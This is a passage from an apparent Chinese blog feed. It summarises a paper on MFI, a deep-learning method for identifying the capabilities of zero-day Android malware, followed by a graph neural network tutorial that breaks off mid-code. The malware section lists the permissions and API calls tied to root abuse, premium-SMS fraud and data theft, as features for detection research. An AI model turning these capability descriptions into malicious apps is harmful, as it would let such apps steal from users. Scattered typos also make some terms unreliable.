alt=\"数据集信息\"></p>\n<p>​\t表四中列出了用于<u>零日家族恶意软件能力识别的数据集的信息</u>。在训练深度神经网络时，<strong>20% 的训练集被随机分割为验证集</strong>，<strong>深度神经网络是用 Keras 库、Scikit-learn 和 Tensorflow 实现的</strong>。</p>\n<h3 id=\"mfi与最先进的方法的比较\"><a class=\"markdownIt-Anchor\" href=\"#mfi与最先进的方法的比较\">#</a> MFI 与最先进的方法的比较</h3>\n<p>​\t现有的工作没有解决李日家族恶意软件的安全隐私相关能力识别问题。我们选择了三个<strong>能够进行恶意软件家族分类的基线模型</strong>，包括（前文提到）：</p>\n<ol>\n<li><strong>Drebin</strong> 是第一个用线耳支持向量机分类器进行家庭分类任务的基线方法。</li>\n<li><strong>MaMaDroid</strong> 是第二种基线方法，采用恶意软件家族模式和随机森林分类器。</li>\n<li><strong>N-opcode</strong> 是第三种基线方法，N=4，采用随机森林算法。</li>\n</ol>\n<blockquote>\n<p><strong>基线方法</strong>是指在机器学习中，<u>使用一些简单的模型作为基准，然后使用更复杂的模型来比较性能</u>。这些简单的模型被称为基线模型，它们可以是随机分类器、最常见类别分类器、简单线性回归和常数预测等。</p>\n</blockquote>\n<p>下图表五列出了我们提出的 MFI 和基线方法之间的性能比较</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa2f831ddac507cca9bb9c.jpg\" alt=\"\"></p>\n<p>​\t在表五中，不难发现，<strong>MFI 在识别安全 / 隐私相关能力方面均优于基线方法</strong>。MFI 的成功归功于三个因素 - 多视图异构特征：<u><strong>基于领域知识的特征选择</strong></u>和<u><strong>API 调用抽象</strong></u>，以及<u><strong>微调的深度神经网络架构</strong></u>。</p>\n<h3 id=\"对能力依赖的理解\"><a class=\"markdownIt-Anchor\" href=\"#对能力依赖的理解\">#</a> 对能力依赖的理解</h3>\n<p>​\t<strong>选择适当的特征来反映特定能力的内在特征</strong>，对于准确捕捉不同安全 / 隐私相关能力的模式至关重要。因此，我们进一步确认并确保权限包龄和 API 调用的功能与 Android 开发者文档中的描述一致</p>\n<ul>\n<li>\n<p><strong>僵尸网络</strong>攻击能力的特征是根据以下三个标准来选择的：</p>\n<ul>\n<li>标准 1：与网络或 WiFiManger 有关的权限和 API 调用功能。</li>\n<li>标准 2：与 PushService 或 HttpConnection 相关的服务或 API 调用功能。</li>\n<li>标准 3：一些不受信任的网络地域如 URL 功能。</li>\n<li><strong>僵尸网络遭网络功击能力的特征数量为 100</strong></li>\n</ul>\n</li>\n<li>\n<p><strong>具有未经授权的 root 访问能力的恶意软件将削弱安卓设备的安全性并获得特权访问</strong>。</p>\n<ul>\n<li>恶意软件在获得 root 权限后可以做的事情将没有限制。像 <u>REBOOT</u>、<u>ACCESS _SUPERUSER</u>或<u>exec()</u>等功能将被识别。</li>\n<li>如果满足以下标准之一，那么该功能将被选择为未经授权的 root 访问能力。\n<ul>\n<li>标准 1：与<strong> System/bin/su</strong> 有关的 API 调用特征或 <strong>Ljava/Lang/Runime—&gt;exec</strong></li>\n<li>标准 2：PackageManager 相关的权限或 API 调用功能，包括在安装软件包、卸载 软件包、更新软件包、删除软件包和重言软件包等方面</li>\n<li>标准 3： 与 <strong>Bool_Compleled</strong> 或<strong> update_device_state</strong> 有关的服务和 BroadCast Receiver 特性。</li>\n<li>标准 4：与<strong> Receive_Boot_Compleled</strong> 相关的意图和行动特征。</li>\n</ul>\n</li>\n<li><strong>未经授权的 root 访问能力的特征数量为 160</strong></li>\n</ul>\n</li>\n<li>\n<p><strong>恶意软件</strong>拥有恶意短信收费能力，可<u>在用户不知情的情况下在后台向高级服务发送短信</u></p>\n<ul>\n<li>所选择的与短信有关的功能包括\n<ul>\n<li><strong>WRITE SMS 、SEND SMS 、sendTextmessage()</strong></li>\n</ul>\n</li>\n<li>详细的功能选择标准如下。\n<ul>\n<li>标准 1：Sms Manager 相关的权限和 API 调用功能，包括<u>send_sms</u>、<u>receive_sms</u>和<u>write_sms</u>。</li>\n<li>标准 2：行动和服务功能，包括<u>Data_Sms_Received</u> 和 <u>Smssenderservice</u></li>\n<li>标准 3：BroadCastReceiver 的相关功能，包括<u>SmsReceived</u>和<u>MessageReceived</u>。</li>\n</ul>\n</li>\n<li><strong>恶意短信收费能力的特征数量为 80 个</strong></li>\n</ul>\n</li>\n<li>\n<p><strong>信息窃取</strong>功能将收集用户的感性和隐私信息如联系人名单、位置或设备 ID，然后将其发送到远程服务器。</p>\n<ul>\n<li>\n<p>以下 5 条标准适用于信息窃取能力的过滤特征</p>\n<ul>\n<li>\n<p>标准 1：涉及<u>敏感位置信息</u>的特征 ，包括<strong> access_coarse_location,</strong></p>\n<p><strong>access_fifine_location 和 locationmanager</strong></p>\n</li>\n<li>\n<p>标准 2：<u>私人信息</u>相关的功能，包括<strong> read_contacts,read_logs, read_history_bookmarks 和 read_phone_state</strong></p>\n</li>\n<li>\n<p>标准 3：<u>不受信任的网络地址 URL</u></p>\n</li>\n<li>\n<p>标准 4：SmsManager 相关权限和 API 调用功能，包括<strong> send_sms、receive_sms 和 write_sms</strong></p>\n</li>\n<li>\n<p>标准 5：行动和服务特征，包括<strong> Data_Sms_Received 和 SmsSenderService.</strong></p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>信息窃取能力的特征数量为 60。</strong></p>\n</li>\n</ul>\n</li>\n</ul>\n<p>​\t为了研究能力相关特征选择的有效性，以<u>恶意短信收费能力</u>为例，我们使用 t 分布式随机邻居嵌入 (t-SNE) 算法展示了测试恶意软件的可视化。t-SNE 是一种降维的方法，特别适合数据集的可视化。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa394d1ddac507ccbda536.jpg\" alt=\"图3\"></p>\n<p>​\t图 3 (a) 是使用完整特征集的恶意软件的可视化结果，而图 3 (b) 显示的是基于选定的能力相关特征的结果。<strong>红点表示拥有恶意短信收费能力的恶意软件，而绿点表示没有恶意短信收费能力的恶意软件样本</strong>。因此，所选择的特征是有辨别力的。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa39ac1ddac507ccbe470b.jpg\" alt=\"图4\"></p>\n<p>​\t<strong>Baseline</strong> 是使用完整特征集的结果  <strong>CDFS</strong> 是指使用所选的依赖能力的特征子集的性能</p>\n<p>​\t因为使用与能力相关的特征有明显的可视化结果。我们还在图 4 中展示了使用全部特征集或选定的能力相关特征的直接性能 (<strong>准确度得分和 F1 得分</strong>) 的比较。因此，<u>使用选定的特征集会有很大的改进</u>。</p>\n<h3 id=\"单视图与多视图功能\"><a class=\"markdownIt-Anchor\" href=\"#单视图与多视图功能\">#</a> 单视图与多视图功能</h3>\n<p>​\t本实验验证了多视图功能是否比单视图功能提供更好的性能，同时确定了零日家庭的安全 / 隐私相关能力。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa3bb61ddac507ccc1eea1.jpg\" alt=\"表6\"></p>\n<p>​\t实验结果列于表六。<strong>多视图特征的结果优于单视图特征</strong>，在准确率得分和 F1 得分方面分别有大约 1%-4% 和 2%-4% 的提高。</p>\n<p>​\t在这项工作中，深度神经网络被设计用来识别恶意软件的安全 / 隐私相关能力。我们研究了识别遭广网各政击能力的深度神经网络的训练和验证损失。<u>训练后的深度神经网络在 300 个 epochs 内迅速收敛</u>。多视图异构特征的直接融合在识别安全 / 隐私相关能力方面的辨别力不够，然而<u>通过使用深度神经网络，可以学习到紧凑的、有鉴别力的表述</u>。这些结果表明，所创建的深度神经网络在聚合多视图异构特征方面是强大的。</p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>​\t在这篇文章中，提出了一个新的问题来识别<strong>零日安卓恶意软件</strong>。为了解决所提出的研究问题，我们设计了一种新的轻量级方法<strong> MFI</strong> 来<u>自动识别新检测到的 Android 恶意软件的能力</u>。为了充分捕捉恶意软件的能力特征 MFI，我们<u><strong>使用多视图异构特征来表示每个恶意软件</strong>，包括来自源代码的语义字符串特征、结构性 API 调用图特征和 smali 操作码序列特征。</u>我们还设计了一个基于源代码视图的能力相关特征视图。对于每个给定的能力，一个单一的深度神经网络将被训练，以确定测试的恶意软件是否具有特定能力。</p>\n<p>​\t在这项工作中，深度神经网络被设计用来识别恶意软件的安全 / 隐私相关能力。多视角异质特征的直接融合在识别安全隐私相关能力方面的区分度不够。<strong>通过使用深度神经网络，可以学习到紧凑的、有辨别力的表征。这些结果表明，创建的深度神经网络在聚合多视角异质特征方面是强大的。</strong></p>\n",
            "tags": [
                "malware"
            ]
        },
        {
            "id": "http://aer0liteee.github.io/post/33e09c9c.html",
            "url": "http://aer0liteee.github.io/post/33e09c9c.html",
            "title": "GNN-summary",
            "date_published": "2023-07-05T09:30:02.000Z",
            "content_html": "<h1 id=\"gnn\"><a class=\"markdownIt-Anchor\" href=\"#gnn\">#</a> GNN</h1>\n<h4 id=\"应用领域\"><a class=\"markdownIt-Anchor\" href=\"#应用领域\">#</a> 应用领域</h4>\n<ul>\n<li></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">场景分析与问题推理、推荐系统、欺诈检测、知识图谱、道路交通、自动驾驶、化学医疗场景......</span><br></pre></td></tr></table></figure>\n<h4 id=\"图基本模块定义\"><a class=\"markdownIt-Anchor\" href=\"#图基本模块定义\">#</a> 图基本模块定义</h4>\n<ul>\n<li>\n<p><img src=\"https://pic.imgdb.cn/item/64aa899f1ddac507cc6b8006.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GNN 又称图神经网络，是一种直接作用于图结构的神经网络，我们可以把图中的每一个结点 V 当作个体对象，而每一条边 E 当作个体与个体间的某种联系，所有结点组成的关系网就是最后的图 U</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"邻接矩阵的定义\"><a class=\"markdownIt-Anchor\" href=\"#邻接矩阵的定义\">#</a> 邻接矩阵的定义</h4>\n<ul>\n<li>\n<p><img src=\"https://pic.imgdb.cn/item/64aa899f1ddac507cc6b808d.png\" alt=\"\"></p>\n<blockquote>\n<ul>\n<li>用于表示结点之间相邻的情况，由于图的稀疏性，因此一般的邻接矩阵不是一个 N*N 的矩阵，而保留了 **(source,target)** 的形式，如 [1,0] 则表示起点为 1 终点为 0。</li>\n<li>每个点通过与它相邻的<strong>邻居</strong>来进行<strong>更新</strong>，更新的方式可以自己设置。</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h4 id=\"适用规则\"><a class=\"markdownIt-Anchor\" href=\"#适用规则\">#</a> 适用规则</h4>\n<ul>\n<li></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GNN主要用于解决输入数据不规则的时候，由于图像和文本任务中输入格式很固定，因此图模型并不常用，图网络和其他的神经网络类似都是需要进行特征提取</span><br></pre></td></tr></table></figure>\n<h4 id=\"消息传递方法计算\"><a class=\"markdownIt-Anchor\" href=\"#消息传递方法计算\">#</a> 消息传递方法计算</h4>\n<ul>\n<li>\n<p>每个点的特征该如何更新？</p>\n<ul>\n<li>\n<p>考虑<strong>自身</strong>的特征与<strong>邻居</strong>的特征。</p>\n</li>\n<li>\n<p><img src=\"https://pic.imgdb.cn/item/64aa89a01ddac507cc6b811e.png\" alt=\"\"></p>\n</li>\n<li>\n<p><img src=\"https://pic.imgdb.cn/item/64aa89a01ddac507cc6b8182.png\" alt=\"\"></p>\n<blockquote>\n<p>​\t\t\t\t\t自身特征：<strong>h/x</strong>\t可学习参数 (相连边的权值)：<strong>W</strong></p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>\n<p>特征更新的方法有很多，可以根据任务自己设置</p>\n<ul>\n<li><img src=\"https://pic.imgdb.cn/item/64aa89a01ddac507cc6b814c.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"多层gcn的作用\"><a class=\"markdownIt-Anchor\" href=\"#多层gcn的作用\">#</a> 多层 GCN 的作用</h4>\n<ul>\n<li>\n<p>GCN 可以有多层（本质即更新各部分的特征）</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa89f01ddac507cc6c55e0.png\" alt=\"\"></p>\n</li>\n<li>\n<p>GNN 可以设置为多层结构时的<strong>输入</strong>和<strong>输出</strong>都是特征，邻接矩阵不会改变，但每个点上面的特征会发生改变。多层的 GNN 会包含更多的邻居，相当于此时的 **“感受野”**（<u>卷积神经网络名词，可理解为接触到的全局的信息范围）</u><strong>增大</strong>，当每个点具有全局的特征时，此时类似于 transformer 的形式。</p>\n</li>\n<li>\n<h5 id=\"输出特征的作用\"><a class=\"markdownIt-Anchor\" href=\"#输出特征的作用\">#</a> 输出特征的作用</h5>\n<ul>\n<li>各个点 / 边特征组合后可以进行图分类…</li>\n</ul>\n</li>\n<li>\n<h5 id=\"为什么要做多层gcn\"><a class=\"markdownIt-Anchor\" href=\"#为什么要做多层gcn\">#</a> 为什么要做多层 GCN？</h5>\n<ul>\n<li>可以使结点具有<strong>全局的特征</strong>，GCN 主要聚合邻结点的信息，对于任意一个结点，结点特征每迭代依次，就聚合了更高阶的邻结点的信息。随着 GCN 层数的增加，结点的聚合半径（最高邻居结点的阶数）也变大，一旦达到某个阈值，该结点覆盖全图结点。</li>\n<li><strong>但是</strong>，如果层数很多，每个结点覆盖的结点都会收敛到全图，这就导致每个结点的局部网络结构的多样性大大降低，对于结点自身特征的学习反而不好。</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"gcn基本模型概述\"><a class=\"markdownIt-Anchor\" href=\"#gcn基本模型概述\">#</a> GCN 基本模型概述</h4>\n<ul>\n<li>适合做<strong>半监督任务</strong>，用某个结点的少量数据也能进行训练</li>\n</ul>\n<h4 id=\"图卷积的基本计算方法\"><a class=\"markdownIt-Anchor\" href=\"#图卷积的基本计算方法\">#</a> 图卷积的基本计算方法</h4>\n<ul>\n<li>\n<p>GCN 基本思想：</p>\n<p>​\t<strong>消息传递 / 聚合</strong>，即<u>平均其自身与邻居特征后传入神经网络</u>（下图橙色结点为例）。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa89f11ddac507cc6c5660.png\" alt=\"\"></p>\n</li>\n<li>\n<p>网络层数：</p>\n<p>​    GCN 可以做多层，但一般浅做 2、3 层较合适 (6 个人认识全世界理论)，不会很多层</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa89f11ddac507cc6c5759.png\" alt=\"\"></p>\n<p>​                                                 <u>最后得到每个点的特征向量</u></p>\n</li>\n<li>\n<p>图中基本组成：</p>\n<ul>\n<li>\n<p><strong>G</strong>—— 图</p>\n</li>\n<li>\n<p><strong>A</strong>—— 邻接矩阵</p>\n</li>\n<li>\n<p><strong>D</strong>—— 各个结点</p>\n</li>\n<li>\n<p><strong>F</strong>—— 每个结点的特征</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa89f11ddac507cc6c582c.png\" alt=\"\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p>特征计算方法：</p>\n<ul>\n<li><strong>矩阵乘法</strong></li>\n<li><img src=\"https://pic.imgdb.cn/item/64aa89f21ddac507cc6c5915.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"邻接的矩阵的变换\"><a class=\"markdownIt-Anchor\" href=\"#邻接的矩阵的变换\">#</a> 邻接的矩阵的变换</h4>\n<ul>\n<li>考虑自身（将度矩阵考虑进去）</li>\n<li>左乘对<strong>行</strong>做<u>归一化</u>操作 + 右乘对<strong>列</strong>做<u>归一化</u>操作（归一化：简化计算的操作）</li>\n</ul>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t大致想法（下图）</p>\n<ul>\n<li><img src=\"https://pic.imgdb.cn/item/64aa8a1e1ddac507cc6ccd3f.png\" alt=\"\"></li>\n</ul>\n<h4 id=\"ugcn基本原理定义u\"><a class=\"markdownIt-Anchor\" href=\"#ugcn基本原理定义u\">#</a> <u>GCN 基本原理 / 定义</u></h4>\n<ul>\n<li>\n<p><img src=\"https://pic.imgdb.cn/item/64aa8a1e1ddac507cc6cce0d.png\" alt=\"\"></p>\n<ul>\n<li><strong>ReLU</strong>，全称为：Rectified Linear Unit，是一种人工神经网络中常用的激活函数，通常意义下，其指代数学中的斜坡函数，即 <u>f ( x ) = max ⁡ ( 0 , x )</u><br>\n<img src=\"https://pic.imgdb.cn/item/64aa8a1e1ddac507cc6ccf50.png\" alt=\"\"></li>\n</ul>\n</li>\n<li>\n<p>GCN 层数</p>\n<ul>\n<li>在多个图数据集中，都可以发现两三层比较合适，多反而差了。</li>\n<li><img src=\"https://pic.imgdb.cn/item/64aa8a1f1ddac507cc6cd107.png\" alt=\"\"></li>\n</ul>\n</li>\n</ul>\n<h4 id=\"pytorch-geometric工具包安装与配置方法略\"><a class=\"markdownIt-Anchor\" href=\"#pytorch-geometric工具包安装与配置方法略\">#</a> PyTorch Geometric 工具包安装与配置方法（略）</h4>\n<ul>\n<li>\n<p><a href=\"https://www.bilibili.com/video/BV1j8411876K?p=12&amp;vd_source=d1abfb72c73986bf3b64ed4a087cdf09%EF%BC%88\">https://www.bilibili.com/video/BV1j8411876K?p=12&amp;vd_source=d1abfb72c73986bf3b64ed4a087cdf09（</a><u>Pytorch Gepmetric</u>）</p>\n</li>\n<li>\n<p><a href=\"https://blog.csdn.net/pointer_onlysoul/article/details/121354353?utm_medium=distribute.pc_relevant.none-task-blog-2\">https://blog.csdn.net/pointer_onlysoul/article/details/121354353?utm_medium=distribute.pc_relevant.none-task-blog-2</a><sub>default</sub>baidujs_baidulandingword~default-0-121354353-blog-109139329.235<sup>v35</sup>pc_relevant_default_base3&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=1</p>\n<p>（<u>Anaconda+PyTorch 安装（非英伟达显卡 + win10+Python3.8）</u>）</p>\n</li>\n<li>\n<p><a href=\"https://blog.csdn.net/C_chuxin/article/details/82690093\">https://blog.csdn.net/C_chuxin/article/details/82690093</a></p>\n<p>​\t\t\t\t(本<u>地 python 库与新装 Anaconda 库并存</u>)</p>\n</li>\n</ul>\n<h4 id=\"数据集与邻接矩阵格式karateclub空手道俱乐部案例\"><a class=\"markdownIt-Anchor\" href=\"#数据集与邻接矩阵格式karateclub空手道俱乐部案例\">#</a> 数据集与邻接矩阵格式（——KarateClub 空手道俱乐部案例）</h4>\n<ul>\n<li>\n<p>Graph Neural Networks</p>\n<ul>\n<li>\n<p>致力于解决<strong>不规则</strong>数据结构 (图像和文本相对格式都固定，但是社交网络与化学分子等格式肯定不是固定的)。</p>\n</li>\n<li>\n<p>GNN 模型<u>迭代更新</u>主要基于图中每个节点及其<strong>邻居</strong>的信息。</p>\n<p><img src=\"https://pic.imgdb.cn/item/64aa8a1f1ddac507cc6cd174.png\" alt=\"\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>数据集</strong>: <u><strong>Zachary’s karate club network</strong></u></p>\n<ul>\n<li>该图描述了一个空手道俱乐部会员的社交关系，以 34 名会员作为节点，如果两位会员在俱乐部之外仍保持社交关系，则在节点间增加一条边。每人节点具有一个 34 维的特征向量，一共有 78 条边。在收集数据的过程中，管理人员 John A 和教练 Mr.Hi 之间产生了冲突，会员们选择了站队，一半会员跟随 Mr.Hi 成立了新俱乐部，剩下一半会员找了新教练或退出了俱乐部。</li>\n</ul>\n</li>\n<li>\n<p>代码实现：</p>\n<ul>\n<li>\n<p>获取数据集，打印基础数据指标</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> torch_geometric.datasets <span class=\"keyword\">import</span> KarateClub</span><br><span class=\"line\"></span><br><span class=\"line\">dataset = KarateClub()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Dataset: <span class=\"subst\">&#123;dataset&#125;</span>:&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;======================&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Number of graphs: <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(dataset)&#125;</span>&#x27;</span>)  <span class=\"comment\"># 图的数量—1</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Number of features: <span class=\"subst\">&#123;dataset.num_features&#125;</span>&#x27;</span>) <span class=\"comment\"># 特征个数—34</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Number of classes: <span class=\"subst\">&#123;dataset.num_classes&#125;</span>&#x27;</span>)  <span class=\"comment\"># 数据种类—4</span></span><br><span class=\"line\"></span><br><span class=\"line\">Output:</span><br><span class=\"line\">    Dataset: KarateClub():</span><br><span class=\"line\">    ======================</span><br><span class=\"line\">    Number of graphs: <span class=\"number\">1</span></span><br><span class=\"line\">    Number of features: <span class=\"number\">34</span></span><br><span class=\"line\">    Number of classes: <span class=\"number\">4</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>PyTorch Geometric 中的每个图形都由单个 Data 对象表示，该对象包含描述其图形表示的所有信息。我们可以随时打印数据对象，以接收有关其属性及其形状的简短摘要：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">data = dataset[<span class=\"number\">0</span>]  <span class=\"comment\"># Get the first graph object.</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;=========================================================&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">Output:</span><br><span class=\"line\">    Data(x=[<span class=\"number\">34</span>, <span class=\"number\">34</span>], edge_index=[<span class=\"number\">2</span>, <span class=\"number\">156</span>], y=[<span class=\"number\">34</span>], train_mask=[<span class=\"number\">34</span>])</span><br><span class=\"line\">\t===========================================================</span><br><span class=\"line\">    </span><br><span class=\"line\">    该数据对象具有<span class=\"number\">4</span>个属性：</span><br><span class=\"line\">    （<span class=\"number\">1</span>）edge_index：<span class=\"string\">&quot;2+边的个数&quot;</span>，属性保存有关图连接性的信息，即每个边缘的源节点和目标节点。 </span><br><span class=\"line\">    （<span class=\"number\">2</span>）PyG进一步将节点特征称为x（为<span class=\"number\">34</span>个节点中的每个节点分配了一个<span class=\"number\">34</span>维特征向量），前面表示样本数量，后面表示特征维度。</span><br><span class=\"line\">    （<span class=\"number\">3</span>）节点标签称为y（每个节点被精确地分配为一个类别）。 </span><br><span class=\"line\">    （<span class=\"number\">4</span>）还有一个名为train_mask的附加属性，它描述了我们已经知道其社区归属的节点。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>详细检查 edge_index 的属性</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> IPython.display <span class=\"keyword\">import</span> Javascript  </span><br><span class=\"line\">display(Javascript(<span class=\"string\">&#x27;&#x27;&#x27;google.colab.output.setIframeHeight(0, true, &#123;maxHeight: 300&#125;)&#x27;&#x27;&#x27;</span>))</span><br><span class=\"line\"> </span><br><span class=\"line\">edge_index = data.edge_index</span><br><span class=\"line\"><span class=\"built_in\">print</span>(edge_index.t())</span><br><span class=\"line\"></span><br><span class=\"line\">Output:</span><br><span class=\"line\">    &lt;IPython.core.display.Javascript <span class=\"built_in\">object</span>&gt;</span><br><span class=\"line\">tensor([[ <span class=\"number\">0</span>,  <span class=\"number\">1</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>,  <span class=\"number\">2</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>,  <span class=\"number\">3</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>,  <span class=\"number\">4</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>,  <span class=\"number\">5</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>,  <span class=\"number\">6</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>,  <span class=\"number\">7</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>,  <span class=\"number\">8</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>, <span class=\"number\">10</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>, <span class=\"number\">11</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>, <span class=\"number\">12</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>, <span class=\"number\">13</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>, <span class=\"number\">17</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>, <span class=\"number\">19</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>, <span class=\"number\">21</span>],</span><br><span class=\"line\">        [ <span class=\"number\">0</span>, <span class=\"number\">31</span>],</span><br><span class=\"line\">        ........</span><br><span class=\"line\">        [<span class=\"number\">33</span>,  <span class=\"number\">8</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>,  <span class=\"number\">9</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">13</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">14</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">15</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">18</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">19</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">20</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">22</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">23</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">26</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">27</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">28</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">29</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">30</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">31</span>],</span><br><span class=\"line\">        [<span class=\"number\">33</span>, <span class=\"number\">32</span>]])</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>networkx 可视化展示</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 导入使用的模块包</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> IPython.core.display_functions <span class=\"keyword\">import</span> display</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch_geometric.datasets <span class=\"keyword\">import</span> KarateClub</span><br><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">import</span> networkx <span class=\"keyword\">as</span> nx</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch_geometric.utils <span class=\"keyword\">import</span> to_networkx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义最后可视化的函数</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">visualize</span>(<span class=\"params\">h, color, epoch=<span class=\"literal\">None</span>, loss=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    plt.figure(figsize=(<span class=\"number\">7</span>, <span class=\"number\">7</span>))</span><br><span class=\"line\">    plt.xticks([])</span><br><span class=\"line\">    plt.yticks([])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> torch.is_tensor(h):</span><br><span class=\"line\">        h = h.detach().cpu().numpy()</span><br><span class=\"line\">        plt.scatter(h[:, <span class=\"number\">0</span>], h[:, <span class=\"number\">1</span>], s=<span class=\"number\">140</span>, c=color, cmap=<span class=\"string\">&quot;Set2&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> epoch <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span> <span class=\"keyword\">and</span> loss <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            plt.xlabel(<span class=\"string\">f&#x27;Epoch: <span class=\"subst\">&#123;epoch&#125;</span>, Loss: <span class=\"subst\">&#123;loss.item():<span class=\"number\">.4</span>f&#125;</span>&#x27;</span>, fontsize=<span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        nx.draw_networkx(G, pos=nx.spring_layout(G, seed=<span class=\"number\">42</span>), with_labels=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                         node_color=color, cmap=<span class=\"string\">&quot;Set2&quot;</span>)</span><br><span class=\"line\">    plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\">G = to_networkx(data, to_undirected=<span class=\"literal\">True</span>)\t<span class=\"comment\">#data上述步骤已给</span></span><br><span class=\"line\">visualize(G, color=data.y)</span><br></pre></td></tr></table></figure>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t<u><strong>可视化</strong></u></p>\n</li>\n<li>\n<p><img src=\"https://pic.imgdb.cn/item/64aa8a441ddac507cc6d246b.png\" alt=\"\"></p>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"模型定义与训练方法\"><a class=\"markdownIt-Anchor\" href=\"#模型定义与训练方法\">#</a> 模型定义与训练方法</h4>\n<ul>\n<li>\n<p>模型定义</p>\n<ul>\n<li>\n<p>三层 GCN</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span 